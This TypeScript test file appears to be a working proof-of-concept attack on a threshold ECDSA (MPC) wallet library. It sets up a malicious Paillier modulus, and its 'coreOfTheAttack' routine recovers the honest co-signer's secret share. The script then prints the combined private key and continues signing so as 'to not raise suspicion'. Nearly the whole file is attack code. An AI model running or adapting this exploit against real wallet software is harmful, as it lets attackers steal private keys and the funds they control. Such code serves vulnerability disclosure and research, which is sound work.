import { Ecdsa, ECDSA } from '../../../../../../sdk-core';
import { hexToBigInt } from '../../../../../../sdk-core/src/account-lib/util/crypto';
import MaliciousEcdsa from '../../../../../../sdk-core/src/account-lib/mpc/tss/ecdsa/maliciousEcdsa';
import * as sinon from 'sinon';
import createKeccakHash from 'keccak';
import * as paillierBigint from 'paillier-bigint';
import { paillerKeys, mockNShares, mockPShare, mockDKeyShare, mockEKeyShare, mockFKeyShare } from '../fixtures/ecdsa';
import { Hash, randomBytes } from 'crypto';
import 'should';
import * as bigintCryptoUtils from 'bigint-crypto-utils';
import { random, isBigIntPrime } from './bigint-helpers.js'
import { getTxRequestChallenge } from "@bitgo/sdk-core/dist/src/bitgo/tss/common";

const modularMultiplicativeInverse = (a: bigint, modulus: bigint) => {
  // Calculate current value of a mod modulus
  const b = BigInt(a % modulus);

  // We brute force the search for the smaller hipothesis, as we know that the number must exist between the current given modulus and 1
  for (let hipothesis = BigInt(1); hipothesis <= modulus; hipothesis++) {
    if ((b * hipothesis) % modulus == BigInt(1)) return hipothesis;
  }
  // If we do not find it, we return 1
  return BigInt(1);
}

const solveCRT = (remainders: bigint[], modules: bigint[]) => {
  // Multiply all the modulus
  const prod: bigint = modules.reduce((acc: bigint, val) => acc * val, BigInt(1));

  return modules.reduce((sum, mod, index) => {
    // Find the modular multiplicative inverse and calculate the sum
    // SUM( remainder * productOfAllModulus/modulus * MMI ) (mod productOfAllModulus)
    const p = prod / mod;
    return sum + (remainders[index] * modularMultiplicativeInverse(p, mod) * p);
  }, BigInt(0)) % prod;
}

function isPrime(num) {
  for (let i = 2, s = Math.sqrt(num); i <= s; i++)
    if (num % i === 0) return false;
  return num > 1;
}

function getRandomArbitrary(min, max) {
  return Math.floor(Math.random() * (max - min) + min)
}

function gcd(a, b) {
  if (a == 0)
    return b;
  return gcd(b % a, a);
}

/**
 * @prettier
 */

async function main() {
  try {
    const MPC = new Ecdsa();
    const MaliciousMPC = new MaliciousEcdsa();
    let keyShares: ECDSA.KeyCombined[];
    let commonPublicKey: string;

    const pallierMock = sinon
      .stub(paillierBigint, 'generateRandomKeys')
      .onCall(0)
      .resolves(paillerKeys[0] as unknown as paillierBigint.KeyPair)
      .onCall(1)
      .resolves(paillerKeys[1] as unknown as paillierBigint.KeyPair)
      .onCall(2)
      .resolves(paillerKeys[2] as unknown as paillierBigint.KeyPair)

    const [A, B, C] = await Promise.all([MPC.keyShare(1, 2, 3), MPC.keyShare(2, 2, 3), MPC.keyShare(3, 2, 3)]);

    const aKeyCombine = MPC.keyCombine(A.pShare, [B.nShares[1], C.nShares[1]]);
    const bKeyCombine = MPC.keyCombine(B.pShare, [A.nShares[2], C.nShares[2]]);
    const cKeyCombine = MPC.keyCombine(C.pShare, [A.nShares[3], B.nShares[3]]);


    keyShares = [
      aKeyCombine,
      bKeyCombine,
      cKeyCombine,
    ];
    commonPublicKey = aKeyCombine.xShare.y;
    pallierMock.reset();

    let signerOne: ECDSA.KeyCombined;
    let signerTwo: ECDSA.KeyCombined;
    let signerOneIndex;
    let signerTwoIndex;

    signerOne = aKeyCombine;
    signerOneIndex = signerOne.xShare.i;
    signerTwo = bKeyCombine;
    signerTwoIndex = signerTwo.xShare.i;

    const primes: bigint[] = []

    while (primes.length < 16) {
      const r = getRandomArbitrary(131072, 262144)
      if (isPrime(r) && isPrime(2 * r + 1)) {
        primes.push(BigInt(r))
      }
    }

    // console.log(`primes : ${primes.join(', ')}`)

    let n = BigInt(1)
    let primesProduct = BigInt(1)
    for (const p of primes) {
      n = n * p * (BigInt(2) * p + BigInt(1))
      primesProduct = primesProduct * p
    }

    let bigPrime = ((BigInt(2) ** BigInt(3056)) / primesProduct ** BigInt(2)) / BigInt(2)
    while (!isBigIntPrime(bigPrime)) {
      bigPrime++
    }
    // bigPrime = BigInt(1)

    // console.log('bigPrime', bigPrime.toString())
    n = n * bigPrime

    // console.log(`N : ${n.toString()}`)

    let phiN = BigInt(1)
    let phiLambda = BigInt(1)
    for (const p of primes) {
      phiN = phiN * (p - BigInt(1)) * (p * BigInt(2))
      phiLambda = phiLambda * (p - BigInt(1))
    }
    // console.log(`phiN : ${phiN.toString()}`)

    const d = phiN / gcd(n, phiN)
    // const d = BigInt(2)
    // console.log(`d : ${d.toString()}`)

    const vPrimeModuloResults = {}

    for (const p of primes) {
      vPrimeModuloResults[p.toString()] = 1
      vPrimeModuloResults[(p * BigInt(2) + BigInt(1)).toString()] = 4
    }

    let v = solveCRT(Object.entries(vPrimeModuloResults).map(x => BigInt(x[1] as number)), Object.entries(vPrimeModuloResults).map(x => BigInt(x[0])))
    const l = random(3071)
    v = (v + (l as bigint) * n) % (n * n)


    globalThis.maliciousPaillierN = n;
    globalThis.maliciousEncryptedK = v % (n * n)
    globalThis.phiLambda = phiLambda
    globalThis.phiN = phiN
    globalThis.craftedV = v


    // Second signer generates their range proof challenge first
    const signerTwoWithChallenge: ECDSA.KeyCombinedWithNTilde = await MPC.signChallenge(
      signerTwo.xShare,
      signerTwo.yShares[signerOneIndex],
    );

    // console.log('n', n, n.toString(16))
    // console.log('encryptedK', globalThis.maliciousEncryptedK, globalThis.maliciousEncryptedK.toString(16))

    // Step One
    // Sign Shares are created by one of the participants (signerOne)
    // with its private XShare and YShare corresponding to the other participant (signerTwo)
    // This step produces a private WShare which signerOne saves and KShare which signerOne sends to signerTwo
    const signShares: ECDSA.SignShareRT = await MaliciousMPC.signShare(
      signerOne.xShare,
      signerTwoWithChallenge.yShares[signerOneIndex],
    );

    // console.log('our n', signerOne.xShare.n.toString())
    // console.log('kShare', signShares.kShare)

    // Step Two
    // signerTwo receives the KShare from signerOne and uses it produce private
    // BShare (Beta Share) which signerTwo saves and AShare (Alpha Share)
    // which is sent to signerOne
    let signConvertS21: ECDSA.SignConvertRT = await MPC.signConvert({
      xShare: signerTwoWithChallenge.xShare,
      yShare: signerTwo.yShares[signerOneIndex], // YShare corresponding to the other participant signerOne
      kShare: signShares.kShare,
    });

    const mu = BigInt(`0x${signConvertS21.aShare?.mu}`)
    const alpha = BigInt(`0x${signConvertS21.aShare?.alpha}`)

    function coreOfTheAttack(value) {
      let primeModuloResults = {};

      for (const p of primes) {
        let primeModulo
        const q = p * BigInt(2) + BigInt(1)
        const b = bigintCryptoUtils.modPow(d, p - BigInt(2), p)
        const z = bigintCryptoUtils.modPow(bigintCryptoUtils.modPow(value, d, q), b, q)
        for (let x = BigInt(0); x < p; x++) {
          if (bigintCryptoUtils.modPow(BigInt(4), x, q) === z) {
            primeModulo = x
            break
          }
        }
        // console.log(`the modulo for prime ${p} is ${primeModulo}`);
        primeModuloResults[p.toString()] = primeModulo;
      }

      // console.log(primeModuloResults)
      // Sanity check
      // for (const [prime, primeModulo] of Object.entries(primeModuloResults)) {
      //   if (globalThis.victimW % BigInt(prime) != BigInt(primeModulo as number)) {
      //     console.log(`Error: the leaked modulo for prime ${prime} is ${primeModulo} but value%${prime} is ${globalThis.victimW % BigInt(prime)}`)
      //   }
      // }

      const reconstructedValue = solveCRT(Object.entries(primeModuloResults).map(x => BigInt(x[1] as number)), Object.entries(primeModuloResults).map(x => BigInt(x[0])))

      return reconstructedValue
    }

    const reconstructedW = coreOfTheAttack(mu)
    const reconstructedGamma = coreOfTheAttack(alpha)
    globalThis.reconstructedW = reconstructedW
    globalThis.reconstructedGamma = reconstructedGamma

    // console.log(`original victim w:                 ${globalThis.victimW}`)
    // console.log('reconstructed victim w from leaks:', reconstructedW)
    // console.log('reconstructed victim gamma from leaks:', reconstructedGamma)

    const myW = calculateW(signerOne.xShare, signerOne.yShares[signerTwoIndex])
    const combinedWs = (reconstructedW + myW) % Ecdsa.curve.order()
    // console.log(`myW                : ${myW}`)
    console.log(`combined public key: ${BigInt('0x' + commonPublicKey).toString()}`)
    console.log(`combined Ws public : ${Ecdsa.curve.basePointMult(combinedWs)}`)
    console.log(`private key: ${combinedWs.toString(16)}`)

    // We have already exfiltrated the private key of signerTwo
    // Now we continue the signature process to not raise suspicion

    // Step Three
    // signerOne receives the AShare from signerTwo and signerOne using the private WShare from step two
    // uses it produce private GShare (Gamma Share) and MUShare (Mu Share) which
    // is sent to signerTwo to produce its Gamma Share
    const signConvertS12: ECDSA.SignConvertRT = await MaliciousMPC.signConvert({
      aShare: signConvertS21.aShare,
      wShare: signShares.wShare,
    });

    // Step Four
    // signerTwo receives the MUShare from signerOne and signerOne using the private BShare from step three
    // uses it produce private GShare (Gamma Share)
    signConvertS21 = await MPC.signConvert({
      muShare: signConvertS12.muShare,
      bShare: signConvertS21.bShare,
    });

    // Step Five
    // signerOne and signerTwo both have successfully generated GShares and they use
    // the sign combine function to generate their private omicron shares and
    // delta shares which they share to each other
    const signCombineOne = MaliciousMPC.signCombine({
      gShare: signConvertS12.gShare as ECDSA.GShare,
      signIndex: {
        i: (signConvertS12.muShare as ECDSA.MUShare).i,
        j: (signConvertS12.muShare as ECDSA.MUShare).j,
      },
    })

    const signCombineTwo = MPC.signCombine({
      gShare: signConvertS21.gShare as ECDSA.GShare,
      signIndex: {
        i: (signConvertS21.muShare as ECDSA.MUShare).i,
        j: (signConvertS21.muShare as ECDSA.MUShare).j,
      },
    })

    const MESSAGE = Buffer.from('TOO MANY SECRETS');

    // Step Six
    // signerOne and signerTwo shares the delta share from each other
    // and finally signs the message using their private OShare
    // and delta share received from the other signer
    const signA = MaliciousMPC.sign(
      MESSAGE,
      signCombineOne.oShare,
      signCombineTwo.dShare,
    )

    const signB = MPC.sign(
      MESSAGE,
      signCombineTwo.oShare,
      signCombineOne.dShare,
    )


    // Step Seven
    // Construct the final signature
    const signature = MPC.constructSignature([signA, signB]);

    // Step Eight
    // Verify signature

    const isValid = MPC.verify(MESSAGE, signature);

    console.log('Is the signature valid?:', isValid);


  } catch (e) {
    console.log(e)
  }
}

function calculateW(xShare, yShare) {
  const d = Ecdsa.curve.scalarMult(Ecdsa.curve.scalarSub(BigInt(yShare.j), BigInt(xShare.i)), BigInt(xShare.i));

  const w = [
    Ecdsa.curve.scalarMult(BigInt(yShare.j), BigInt(xShare.i)),
    hexToBigInt(xShare['x']),
    Ecdsa.curve.scalarInvert(d),
  ].reduce(Ecdsa.curve.scalarMult);

  return w
}

describe('leak', function() {
  it('extracts key', main)
})
